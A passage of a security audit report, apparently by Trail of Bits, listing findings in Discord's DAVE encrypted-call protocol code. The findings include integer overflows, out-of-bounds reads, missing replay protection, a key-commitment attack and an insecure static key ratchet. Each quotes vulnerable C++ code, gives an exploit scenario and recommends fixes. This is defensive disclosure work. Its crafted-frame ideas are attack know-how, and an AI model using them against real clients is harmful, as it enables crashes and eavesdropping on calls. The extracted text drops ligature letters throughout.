        "body": "The InboundFrameProcessor::ParseFrame method computes the oset of the magic marker as frame.end() - sizeof(MagicMarker) before checking that the frame buer is large enough to contain the magic marker. The result of this expression is well-dened only if the result is inside (or one past the end) of the buer that frame.begin() points to. // Check the frame ends with the magic marker auto magicMarkerBuffer = frame.end() - sizeof(MagicMarker); if (frame.size() < sizeof(MagicMarker) || memcmp(magicMarkerBuffer, &kMarkerBytes, sizeof(MagicMarker)) != 0) { Return; } Figure 1.1: The frame processor computes the oset of the magic marker before checking that the frame is large enough to contain the magic marker (discord_common/native/secure_frames/frame_processors.cpp#160-165) If the frame buer is smaller than sizeof(MagicMarker), this is undened behavior. (For additional details, see the C++ reference section on pointer arithmetic.) Figure 1.2: The expression P - J is well-dened only if the result points to an element of the array, or immediately past the end of the array. Since the expression represents undened behavior, the compiler is free to assume that this never happens and optimizes the surrounding code accordingly. This could potentially cause stability or security issues. Exploit Scenario A malicious Discord user discovers that short media frames cause some Discord clients to become unstable and crash. She uses this to kick users from video calls by sending short media frames to crash their clients. Recommendations Short term, check the media frame size before computing the oset of the magic marker. Long term, fuzz the frame parser with undened behavior sanitizer (UBSAN) enabled to identify any other instances of undened behavior. To enable UBSAN when using AFL++, set the environment variable AFL_USE_UBSAN to 1 before building.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Insu\u0000cient validation of unencrypted ranges ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The ValidateUnencryptedRanges function checks that the list of unencrypted ranges in the frame is ordered consecutively and that the ranges are contained within the frame. However, since the addition of the oset and size of a single range may overow during validation, both properties could be invalidated by a maliciously crafted frame. // validate that the ranges are in order and don't overlap for (auto i = 1u; i < unencryptedRanges.size(); ++i) { auto prev = unencryptedRanges[i - 1]; auto current = unencryptedRanges[i]; if (prev.offset + prev.size > current.offset) { DISCORD_LOG(LS_WARNING) << \"Unencrypted range may overlap or be out of order: prev offset: \" << prev.offset << \", prev size: \" << prev.size << \", current offset: \" << current.offset << \", current size: \" << current.size; return false; } } // validate that the last range doesn't exceed the frame size auto last = unencryptedRanges.back(); if (last.offset + last.size > frameSize) { DISCORD_LOG(LS_WARNING) << \"Unencrypted range exceeds frame size: offset: \" << last.offset << \", size: \" << last.size << \", frame size: \" << frameSize; return false; } Figure 2.1: Computing the end of the range may overow in ValidateUnencryptedRanges (discord_common/native/secure_frames/frame_processors.cpp#76-96) For example, if the last range oset is equal to 0xFFFFFFFFFFFFFFFF and the corresponding size is 1, their sum will overow and the result will be 0, which means that the nal check above will pass even though the oset is outside the frame buer. By choosing the unencrypted ranges and osets maliciously, an attacker could cause the frame processor to read out of bounds or allocate large amounts of memory in AddCiphertextBytes and AddAuthenticatedBytes, which use the unencrypted range osets and sizes to copy data from the frame buer. // Split the frame into authenticated and ciphertext bytes size_t frameIndex = 0; for (const auto& range : unencryptedRanges_) { auto encryptedBytes = range.offset - frameIndex; if (encryptedBytes > 0) { assert(frameIndex + encryptedBytes <= frame.size()); AddCiphertextBytes(frame.data() + frameIndex, encryptedBytes); } assert(range.offset + range.size <= frame.size()); AddAuthenticatedBytes(frame.data() + range.offset, range.size); frameIndex = range.offset + range.size; } Figure 2.2: If the checks performed by the InboundFrameProcessor::ParseFrame method overow as well, a maliciously crafted frame could cause large allocations inside AddCiphertextBytes or AddAuthenticatedBytes. (discord_common/native/secure_frames/frame_processors.cpp#232-244) void InboundFrameProcessor::AddCiphertextBytes(const uint8_t* data, size_t size) { ciphertext_.resize(ciphertext_.size() + size); memcpy(ciphertext_.data() + ciphertext_.size() - size, data, size); } Figure 2.3: The AddCiphertextBytes method allocates memory based on the unencrypted ranges. (discord_common/native/secure_frames/frame_processors.cpp:279-283) Exploit Scenario A malicious Discord user sends media frames with invalid unencrypted ranges. This causes other clients on the call to run out of memory and crash when they attempt to parse these frames. Recommendations Short term, use __builtin_add_overflow (which is available for both GCC and Clang) to detect overows when validating the unencrypted ranges. Long term, always use checked arithmetic when computing with untrusted inputs. Regularly review fuzz test coverage to ensure that security-relevant code is exercised by the fuzzer. Consider building the fuzzer with the -fsanitize=unsigned-integer-overflow ag to detect unsigned integer overows.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Insu\u0000cient Windows key data size validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The convertBlob lambda expression dened in the GetNativePersistedKeyPair function for Windows checks the size of the input blob before casting it to a BCRYPT_ECCKEY_BLOB pointer. However, the size is checked against the size of a BCRYPT_ECCKEY_BLOB pointer (which is either four or eight bytes depending on the architecture) rather than the size of an actual BCRYPT_ECCKEY_BLOB structure (which is eight bytes). if (blob.size() < sizeof(PBCRYPT_ECCKEY_BLOB)) { DISCORD_LOG(LS_ERROR) << \"Exported key blob too small in GetPersistedKeyPair/convertBlob: \" << blob.size(); return false; } PBCRYPT_ECCKEY_BLOB header = (PBCRYPT_ECCKEY_BLOB)blob.data(); Figure 3.1: The size check mistakenly uses PBCRYPT_ECCKEY_BLOB instead of BCRYPT_ECCKEY_BLOB. (discord_common/native/secure_frames/mls/detail/ persisted_key_pair_win.cpp#69-76) Since the correct size check is performed before convertBlob is called, this is currently not a problem, but could become an issue in the future if the calling function is refactored. Exploit Scenario The GetNativePersistedKeyPair function for Windows is refactored and the duplicate size check outside convertBlob is removed. Since the check in convertBlob checks the blob size against the pointer size rather than the structure size, the function could end up reading out of bounds on 32-bit architectures. Recommendations Short term, unify the key data validation in the GetNativePersistedKeyPair function and ensure that the size of the blob is checked against the size of the actual structure. Long term, use a tool like CodeQL to identify locations where the size of a buer is checked against the size of a pointer rather than a structure.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Call participants can send di\u0000erent media frames to lagging participants ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "When responding to issues of abuse in a group call, it is important for participants to be able to correctly identify who is acting abusively. If an abusive participant is able to make their actions appear dierently to dierent parties, they can muddy the waters. They could evade consequences, or even directly abuse a target, by attacking the credibility of their accusers. The Discord E2EE call protocol does not guarantee that each participant receives the same video feed from any given participant, and furthermore does not have a mechanism to allow participants to detect when dierent clients have received conicting data from one participant. Since audio and video trac is forwarded through the selective forwarding unit, it should not be possible to send a dierent ciphertext to each participant, but it is possible to send dierent video to participants who are lagging behind due to the exibility of the decryption logic (shown below in gure 4.1). // Try and decrypt with each valid cryptor // reverse iterate to try the newest cryptors first bool success = false; for (auto it = cryptorManagers_.rbegin(); it != cryptorManagers_.rend(); ++it) { auto& cryptorManager = *it; success = DecryptImpl(cryptorManager, mediaType, *localFrame, frame); if (success) { break; } } Figure 4.1: Active entries in the cryptorManagers vector are tried in newest-to-oldest order (discord/discord_common/native/secure_frames/decryptor.cpp#93102) This is possible since AES-GCM is not key committing, which means that it is possible to create AES-GCM ciphertexts that decrypt to dierent valid plaintexts under dierent keys. In one attack, the victim does not yet have the most recent cryptorManager. The attacker creates a malicious encrypted frame that successfully decrypts to two dierent messages: a benign frame for the newest key, and an abusive frame for the previous key. Participants who have the most recent encryption key will decrypt the benign frame, while those who have not yet adopted it will decrypt the abusive frame. In another attack, the victim has not yet removed a recently expired cryptorManager, but other participants have. The attacker sends the malicious frames using the oldest key, and only the victim decrypts it successfully. If Discord E2EE calls eventually allow direct peer-to-peer connections, or if an attacker can manipulate the selective forwarding unit to choose which packets are sent to which recipient, this attack becomes much more powerful. In that case, an attacker would be able to send entirely dierent ciphertexts to each participant. Exploit Scenario Alice and Bob participate in competitive Go Fish tournaments with their friends over Discord calls. Bob wishes to get Alice disqualied, so he attempts to make it seem like Alice is cheating. Bob modies his Discord client so that dierent audio is sent to Alice than is sent to anybody else. Bob asks Alice for twos, while sending a request for sevens to the remainder of the call. Alice responds Go Fish, and after a few more turns, Alice gives sevens to another player, after which Bob accuses Alice of lying about not having sevens. Since everyone except Alice heard that Bob asked for sevens, Alice is disqualied for cheating despite Bob being the culprit. Recommendations Short term, document this attack and ensure that the Trust and Safety team is aware that sophisticated users may be able to send dierent data to each participant without those participants knowledge. Long term, design mitigations to detect and ag potential inconsistencies in data that each client receives from each participant. References  How to Abuse and Fix Authenticated Encryption Without Key Commitment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Encrypted frames can be delivered multiple times or out-of-order ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "When decrypting a received frame, the client does not perform any specic validation to ensure that the received frames are distinct or delivered in order. Figure 5.1 shows how the client determines the nonce and encryption key based on data in the packet. Any packet whose corresponding key and nonce have not expired will be accepted, including packets that have already been received, or packets that were created before the most recently received frame. This allows a Discord insider to manipulate the video and audio data received by a particular client by rearranging it. bool Decryptor::DecryptImpl(CryptorManager& cryptorManager, MediaType mediaType, InboundFrameProcessor& encryptedFrame, ArrayView<uint8_t> frame) { auto tag = encryptedFrame.GetTag(); auto truncatedNonce = encryptedFrame.GetTruncatedNonce(); // ... [redacted] // expand the truncated nonce to the full sized one needed for decryption auto nonceBuffer = std::array<uint8_t, kAesGcm128NonceBytes>(); memcpy(nonceBuffer.data() + kAesGcm128TruncatedSyncNonceOffset, &truncatedNonce, kAesGcm128TruncatedSyncNonceBytes); auto nonceBufferView = MakeArrayView<const uint8_t>( nonceBuffer.data(), nonceBuffer.size()); auto generation = cryptorManager.ComputeWrappedGeneration( truncatedNonce >> kRatchetGenerationShiftBits); // Get the cryptor for this generation ICryptor* cryptor = cryptorManager.GetCryptor(generation); // ... [redacted] // perform the decryption bool success = cryptor->Decrypt( plaintext, ciphertext, tag, nonceBufferView, authenticatedData); stats_[mediaType].decryptAttempts++; if (success) { cryptorManager.ReportCryptorSuccess(generation); } return success; } Figure 5.1: The nonce and key are derived only from data in the packet (discord/discord_common/native/secure_frames/decryptor.cpp#139179) It is hard to eectively manipulate video and audio by rearranging it without knowing the underlying data, so the exploit scenario below does not include the creation of targeted misleading content. However, with the assistance of a call participant, an adversary could create cheapfakes by rearranging and selectively removing the audio and video some clients receive. Since the underlying video codecs have their own sequence numbering, it does not appear to be possible to make video cheapfakes. According to the Discord team, the current audio codecs may not always have sequence numbering, which may still allow the creation of audio-only cheapfakes. Recommendations Short term, add replay protection to the DAVE protocol. This can be done by, for example, adding a sequence number to packets, tracking the most recent sequence number received from each remote user, and rejecting packets with sequence numbers that are older than the most recent frame. The existing truncated nonce can be used as a sequence number, in lieu of a sequence number, to reduce packet size. Long term, extend the design goals of integrity and authenticity to clearly specify what users should expect from both the within-frame and across-frame behavior of an E2EE call.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "6. Unencrypted range o\u0000sets and sizes are not authenticated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The unencrypted range osets and sizes are not included in the associated data passed to AES-GCM, which means that they can be tampered with by an attacker with privileged network access who is able to modify encrypted frames. const auto& unencryptedRanges = frameProcessor->GetUnencryptedRanges(); auto unencryptedRangesSize = UnencryptedRangesSize(unencryptedRanges); auto additionalData = MakeArrayView(unencryptedBytes.data(), unencryptedBytes.size()); auto plaintextBuffer = MakeArrayView(encryptedBytes.data(), encryptedBytes.size()); auto ciphertextBuffer = MakeArrayView(ciphertextBytes.data(), ciphertextBytes.size()); // ... [redacted] // encrypt the plaintext, adding the unencrypted header to the tag bool success = cryptor->Encrypt( ciphertextBuffer, plaintextBuffer, nonceBufferView, additionalData, tagBuffer); // ... [redacted] Figure 6.1: The unencrypted range osets and sizes are not included in the associated data passed to the underlying AEAD. (discord_common/native/secure_frames/encryptor.cpp#79-120) We note that encrypted frames are sent using a dedicated encrypted and authenticated channel between each client and Discord server. It follows that the ability to carry out this attack requires a high level of access to network trac. For this reason, we have rated the diculty of exploiting this issue as high. Discord is aware of this issue and has already considered switching to an unauthenticated cipher mode like AES-CTR, and using truncated HMACs for authentication. This would allow them to decouple encryption and authentication, and authenticate the entire encrypted frame before it is parsed. However, Discord found that this solution did not provide sucient performance for their use case. Exploit Scenario A privileged attacker with the ability to modify encrypted frames changes the unencrypted range osets and sizes in an encrypted frame. Since unencrypted ranges are not validated correctly (see nding TOB-DISCE2EC-2), this allows the attacker to cause receiving clients to crash when they attempt to parse the frame. Recommendations Short term, document this issue together with any potential solutions considered in the protocol design documentation. This ensures that the risk remains known and that the problem can be revisited and potentially solved in the future. Long term, continue to investigate ways to decouple authentication from encryption in a way that provides sucient performance for the DAVE protocol. Work toward a solution that avoids the need for codec-aware encryption, which also removes the need for the unencrypted ranges.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Insu\u0000cient size validation in SerializeUnencryptedRanges ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "When the unencrypted range osets and sizes are written to the output message buer, the SerializeUnencryptedRanges function checks that the current range will t within the buer by asserting that the serialized size of each range is less than or equal to the buer size. However, since there is typically more than one unencrypted range, this check should be performed against the remaining buer size rather than the total buer size. uint8_t SerializeUnencryptedRanges(const Ranges& unencryptedRanges, uint8_t* buffer, size_t bufferSize) { } auto writeAt = buffer; for (const auto& range : unencryptedRanges) { assert(Leb128Size(range.offset) + Leb128Size(range.size) <= bufferSize && \"Buffer is too small to serialize unencrypted ranges\"); writeAt += WriteLeb128(range.offset, writeAt); writeAt += WriteLeb128(range.size, writeAt); } return writeAt - buffer; Figure 7.1: The SerializeUnencryptedRanges function checks the serialized size of each range against the total buer size. (discord_common/native/secure_frames/frame_processors.cpp#27-39) This means that the function can still write out of bounds if multiple unencrypted ranges are serialized to the given buer. However, since the buer used to hold the unencrypted ranges is ensured to be large enough to hold all the serialized ranges by the calling function (Encryptor::Encrypt), this issue is never triggered. Recommendations Short term, track the remaining buer size and check the required size against the remaining size in each iteration of the for-loop in SerializeUnencryptedRanges. Long term, use a property testing framework like RapidCheck to test individual functions on randomized inputs. Document the invariants assumed by each internal function.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "9. Out-of-bounds read in FindNextH26XNaluIndex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The FindNextH26XNaluIndex function searches through a buer for the next H.264 NAL unit start sequence and returns the oset of the rst start sequence found. To avoid reading out of bounds, the main loop considers only osets that are less than bufferSize - kH26XNaluShortStartSequenceSize. // look for NAL unit 3 or 4 byte start code for (size_t i = searchStartIndex; i < bufferSize - kH26XNaluShortStartSequenceSize;) { if (buffer[i + 2] > kH26XStartCodeHighestPossibleValue) { // third byte is not 0 or 1, can't be a start code // ... [redacted] } else if (buffer[i + 2] == kH26XStartCodeEndByteValue) { // third byte matches the start code end byte, might be a start code // ... [redacted] } else { // third byte is 0, might be a four byte start code // ... [redacted] } } Figure 9.1: The computation of the upper bound in the main loop in FindNextH26XNaluIndex could overow (discord_common/native/secure_frames/codec_utils.cpp#81-109) However, if the buer size is smaller than kH26XNaluShortStartSequenceSize, the subtraction computing the upper bound will overow, leading to an out-of-bounds read. We believe that this should typically never happen in practice, but could occur due to some edge case or implementation error in the H.264 encoder. Exploit Scenario An edge case in the H.264 codec causes the encoder to release frames shorter than three bytes. This causes the FindNextH26XNaluIndex function to read out of bounds and crash the client. Recommendations Short term, exit early in FindNextH26XNaluIndex if the buer is too short to contain the start sequence. Long term, use a property testing framework like RapidCheck to test individual functions on randomized inputs. Document the invariants assumed by each internal function.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Insu\u0000cient validation of proposal type ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The DAVE protocol only recognizes MLS Add and Remove proposals sent by the delivery service, which is added as an external sender to each group. All proposals are validated by the mlspp library, and the client then performs additional validation in the ValidateProposalMessage function. bool Session::ValidateProposalMessage( ::mlspp::AuthenticatedContent const& message, ::mlspp::State const& targetState, std::set<std::string> const& recognizedUserIDs) const { if (message.wire_format != ::mlspp::WireFormat::mls_public_message) { // ... [redacted] } if (message.content.epoch != targetState.epoch()) { // ... [redacted] } if (message.content.content_type() != ::mlspp::ContentType::proposal) { // ... [redacted] } if (message.content.sender.sender_type() != ::mlspp::SenderType::external) { // ... [redacted] } const auto& proposal = ::mlspp::tls::var::get<::mlspp::Proposal>(message.content.content); if (proposal.proposal_type() == ::mlspp::ProposalType::add) { // ... [redacted] } return true; } Figure 10.1: The Discord client fails to validate the proposal type (discord_common/native/secure_frames/mls/session.cpp#201-246) This function ensures that the sender is the delivery service, but fails to ensure that the proposal is either an Add or a Remove. According to the MLS RFC section on external proposals, the only proposal types allowed from an external sender are:  Add  Remove  PSK  ReInit  GroupContextExtensions However, we could not nd anywhere in mlspp where this is actually checked. This essentially means that the server is free to send invalid proposals to selected clients, which could cause stability issues and potentially crash clients. However, we note that since the server is free to deny service or remove clients from a group at any time, we do not think that this represents a signicant risk to the system. Exploit Scenario An attacker with a privileged network position sends invalid Update proposals to selected Discord clients, causing these clients to crash. Recommendations Short term, restrict the proposal type to Add and Remove proposals in the ValidateProposalMessage function. Long term, consider performing a security review of the mlspp library to ensure that it conforms to the MLS RFC.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Static key ratchet used in production code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The static key ratchet is an insecure keying algorithm that uses the user ID to key the underlying AEAD. It is unproblematic to use for testing purposes, but would be catastrophic to use in a production environment since it completely breaks all condentiality and integrity guarantees provided by the protocol. The Connection::MakeUserKeyRatchet method returns a static key ratchet instance if the given protocol version is less than kTempMLSProtocolVersionSeparator. std::unique_ptr<secure_frames::IKeyRatchet> Connection::MakeUserKeyRatchet( std::string const& userId, secure_frames::ProtocolVersion protocolVersion) const { if (protocolVersion < secure_frames::kTempMLSProtocolVersionSeparator) { return MakeSimpleKeyRatchet(userId, protocolVersion); } else { if (!mlsSession_) { DISCORD_LOG(LS_WARNING) << \"Cannot make user key ratchet: MLS session not initialized\"; return nullptr; } return mlsSession_->GetKeyRatchet(userId); } } Figure 15.1: The Discord native library will use an insecure keying algorithm for protocol versions below kTempMLSProtocolVersionSeparator. (discord_native_lib/src/media/connection.cpp#700-715) std::unique_ptr<secure_frames::IKeyRatchet> MakeSimpleKeyRatchet( const std::string& userID, uint32_t version) { if (version == 0) { return nullptr; } return std::make_unique<secure_frames::StaticKeyRatchet>(userID); } Figure 15.2: The static key ratchet algorithm is insecure and should not be exposed in production builds. (discord_native_lib/src/media/frame_cryptors.cpp#29-37) The MakeUserKeyRatchet method is called when the connection is rst set up, as well as when the client receives a secure-frames-prepare-transition control message from the server. We could not nd any logic in the client that would prevent the Discord server from sending a secure-frames-prepare-transition message with a protocol version lower than kTempMLSProtocolVersionSeparator; this eectively disables encryption for all clients. Exploit Scenario The static key ratchet is not removed from the production version of the Discord client before the system is deployed. This allows a Discord insider to disable encryption and eavesdrop on selected end-to-end encrypted calls. Recommendations Short term, refactor the Discord native library and libdave library to include the static key ratchet only in debug builds. Long term, use the static key ratchet only for testing purposes. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    }
]